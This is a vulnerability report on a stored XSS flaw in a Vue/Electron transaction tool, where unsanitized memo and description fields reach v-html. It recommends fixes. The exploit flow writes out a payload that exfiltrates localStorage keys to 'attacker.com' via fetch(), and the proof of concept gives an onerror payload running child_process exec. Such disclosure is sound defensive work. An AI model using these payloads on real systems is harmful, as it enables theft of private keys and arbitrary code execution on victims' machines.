### Title
Stored XSS via Unsanitized `transactionMemo` and `groupItem.description` Rendered with `v-html` in `CreateTransactionGroup.vue`

### Summary
The `CreateTransactionGroup.vue` page renders `groupItem.description` and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` directly into the DOM using Vue's `v-html` directive without any sanitization. In Organization Mode, a malicious organization member can craft a transaction with an XSS payload in the memo field, submit it to the shared backend, and cause arbitrary script execution in any victim member's Electron renderer process when they load that group.

### Finding Description

**Root Cause:**

In `front-end/src/renderer/pages/CreateTransactionGroup/CreateTransactionGroup.vue`, lines 421–429, the following `v-html` binding renders attacker-controlled strings without sanitization: [1](#0-0) 

```html
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
```

Two attacker-controlled values flow into `v-html`:

1. **`groupItem.description`** — a free-text field stored in the backend, settable by any organization member who creates a group item.
2. **`Transaction.fromBytes(groupItem.transactionBytes).transactionMemo`** — the transaction memo is a free-text field embedded in the serialized transaction bytes. Any organization member who creates a transaction controls this value.

Both values are fetched from the organization backend via `transactionGroup.fetchGroup()` inside `handleLoadGroup`: [2](#0-1) 

The data is stored in the backend and served to any organization member who opens the group. There is no HTML sanitization at any point in the pipeline — not at ingestion, not at storage, and not at render time.

For comparison, the `notice-gen` utility does implement an HTML sanitizer, but it is not used in the front-end rendering path: [3](#0-2) 

The `TokenInfo` interface confirms that `name`, `symbol`, and `memo` fields from the mirror node are also unfiltered strings, though the primary injection surface here is the transaction memo and group item description: [4](#0-3) 

**Exploit Flow:**

1. Attacker (malicious organization member) creates a transaction with `transactionMemo = '<img src=x onerror="fetch(\'http://attacker.com/?k=\'+localStorage.getItem(\'key\'))">'` or any JavaScript payload.
2. Attacker adds this transaction to a transaction group and submits it to the shared organization backend.
3. Victim (another organization member) navigates to the Create Transaction Group page and loads the group (e.g., directed via a shared link or normal collaborative workflow).
4. `handleLoadGroup` fetches the group from the backend; `v-html` renders the malicious memo as raw HTML.
5. The injected script executes in the victim's Electron renderer process.

### Impact Explanation

This is a **stored XSS** in an **Electron desktop application**. The Electron renderer process has access to IPC channels that communicate with the main process, which manages the local SQLite database (via Prisma) containing private keys and mnemonics. A successful XSS payload can:

- Invoke Electron IPC handlers to read private keys and recovery phrases from the local database.
- Exfiltrate key material to an attacker-controlled server.
- Sign and submit unauthorized Hedera transactions on behalf of the victim.

This directly enables **theft of private keys and loss of funds**, which is the highest-impact outcome for this application.

### Likelihood Explanation

The attacker precondition is being a **regular (non-privileged) organization member** — the lowest trust level in the system. No admin access, no leaked credentials, and no privileged keys are required. Creating transactions and transaction groups is the core normal workflow of the application. The victim only needs to open a group page, which is a routine action in collaborative organization workflows. The attack is persistent (stored in the backend) and does not require real-time interaction with the victim.

### Recommendation

Replace the `v-html` binding with safe text interpolation (`{{ }}`) wherever the content is not intentionally authored HTML. If HTML rendering is genuinely required for the transfer summary (`makeTransfer`), sanitize the output using a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing it to `v-html`:

```js
import DOMPurify from 'dompurify';
// ...
v-html="DOMPurify.sanitize(makeTransfer(index))"
```

For `groupItem.description` and `transactionMemo`, switch to plain text interpolation:

```html
<span>{{ groupItem.description || Transaction.fromBytes(...).transactionMemo }}</span>
```

This eliminates the injection surface entirely for those fields.

### Proof of Concept

**Attacker steps (organization member):**

1. In the Hedera Transaction Tool, log in as any organization member.
2. Create a new `CryptoTransfer` transaction. In the **Transaction Memo** field, enter:
   ```
   <img src=x onerror="require('child_process').exec('calc.exe')">
   ```
   (or a data-exfiltration payload targeting the local Prisma/SQLite store).
3. Add this transaction to a new Transaction Group and save/submit it to the organization backend.
4. Note the group ID from the URL or backend response.

**Victim steps (another organization member):**

5. Navigate to `/create-transaction-group?id=<GROUP_ID>`.
6. The page calls `handleLoadGroup`, fetches the group, and renders the transaction row with `v-html`.
7. The `<img onerror>` handler fires, executing arbitrary JavaScript in the victim's Electron renderer process.

**Expected result:** Arbitrary code execution in the victim's Electron renderer, with access to IPC channels, local key storage, and the ability to sign unauthorized transactions.

function sanitize(input) {

      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;',
      '`': '&#96;',
